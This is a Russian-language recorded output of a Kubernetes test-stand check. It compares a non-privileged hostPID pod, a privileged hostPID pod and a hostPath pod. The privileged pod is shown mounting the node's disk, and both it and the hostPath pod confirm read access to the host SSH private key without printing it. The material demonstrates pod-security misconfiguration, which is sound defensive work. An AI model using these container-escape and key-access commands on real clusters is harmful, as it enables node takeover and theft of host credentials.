Записанный вывод проверки. Показывать, если стенд не отвечает.

Прогон 22 ноября 2026 на управляемом кластере стенда, Kubernetes `v1.35.1`.
Пространство имён `default`. Секрета нет.
У `hostpid-mount-nopriv` заданы `hostPID: true`, `privileged: false` и `runAsUser: 0`.
У `hostpid-mount-priv` заданы `hostPID: true`, `privileged: true` и `runAsUser: 0`.
У `hostpath-mount` заданы `privileged: false`, `runAsUser: 0` и том `hostPath` `/etc` в путь `/host-etc`.

Состояние подов после применения манифеста:

```bash
$ kubectl get pods -l case=host-mount
NAME                   READY   STATUS    RESTARTS   AGE
hostpath-mount         1/1     Running   0          4s
hostpid-mount-nopriv   1/1     Running   0          4s
hostpid-mount-priv     1/1     Running   0          4s
```

Под `hostpid-mount-nopriv`. Процесс идёт от uid `0`, `CapEff` равен `00000000a80425fb`:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root),10(wheel)
```

```bash
$ grep -E "^(Uid|CapEff)" /proc/self/status
Uid:	0	0	0	0
CapEff:	00000000a80425fb
```

Переход к корню узла через `/proc/1/root` не проходит:

```bash
$ ls -ld /proc/1/root /proc/1/root/etc
ls: /proc/1/root/etc: Permission denied
ls: /proc/1/root: cannot read link: Permission denied
lrwxrwxrwx    1 root     root             0 Nov 22 05:25 /proc/1/root
```

Привязка `/proc/1/root/etc` не проходит. Устройства `/dev/vda1` в контейнере нет, поэтому монтирование диска узла тоже не проходит:

```bash
$ mount -o bind /proc/1/root/etc /tmp/hostetc
mount: mounting /proc/1/root/etc on /tmp/hostetc failed: Permission denied
```

```bash
$ ls -l /dev/vda1
ls: /dev/vda1: No such file or directory
```

```bash
$ mount -t ext4 /dev/vda1 /tmp/hostroot
mount: mounting /dev/vda1 on /tmp/hostroot failed: No such file or directory
```

Под `hostpid-mount-priv`. Процесс идёт от uid `0`, `CapEff` равен `000001ffffffffff`, AppArmor — `unconfined`:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root),10(wheel)
```

```bash
$ grep -E "^(Uid|CapEff)" /proc/self/status; echo apparmor:$(cat /proc/self/attr/current)
Uid:	0	0	0	0
CapEff:	000001ffffffffff
apparmor:unconfined
```

Каталог `/proc/1/root/etc` открывается. Корень узла в таблице монтирования — `/dev/vda1`, файловая система `ext4`:

```bash
$ ls -ld /proc/1/root/etc
drwxr-xr-x  103 root     root          4096 Nov 13 00:55 /proc/1/root/etc
```

```bash
$ awk '$2=="/" {print $1, $2, $3}' /proc/1/mounts
/dev/vda1 / ext4
```

Привязка `/proc/1/root/etc` даёт `Invalid argument`. Монтирование `/dev/vda1` завершается с кодом 0. Файл владельца `root` с режимом `0600` на этом диске читается, содержимое не выводится. После чтения диск размонтирован:

```bash
$ mount -o bind /proc/1/root/etc /tmp/hostetc
mount: mounting /proc/1/root/etc on /tmp/hostetc failed: Invalid argument
```

```bash
$ mount -t ext4 /dev/vda1 /tmp/hostroot; echo mount-exit:$?
mount-exit:0
```

```bash
$ f=/tmp/hostroot/etc/ssh/ssh_host_ed25519_key; ls -l "$f" | awk '{print $1, $3}'; if dd if="$f" of=/dev/null bs=1 count=1 >/dev/null 2>/tmp/e; then echo read-ok; else echo read-fail; fi; umount /tmp/hostroot
-rw------- root
read-ok
```

Под `hostpath-mount`. Процесс идёт от uid `0`, `CapEff` равен `00000000a80425fb`. Каталог `/host-etc` — это `/etc` узла. Тот же файл читается, содержимое не выводится:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root),10(wheel)
```

```bash
$ grep CapEff /proc/self/status
CapEff:	00000000a80425fb
```

```bash
$ ls -ld /host-etc
drwxr-xr-x  103 root     root          4096 Nov 13 00:55 /host-etc
```

```bash
$ f=/host-etc/ssh/ssh_host_ed25519_key; ls -l "$f" | awk '{print $1, $3}'; if dd if="$f" of=/dev/null bs=1 count=1 >/dev/null 2>/tmp/e; then echo read-ok; else echo read-fail; fi
-rw------- root
read-ok
```

Ресурсы проверки после прогона удалены.
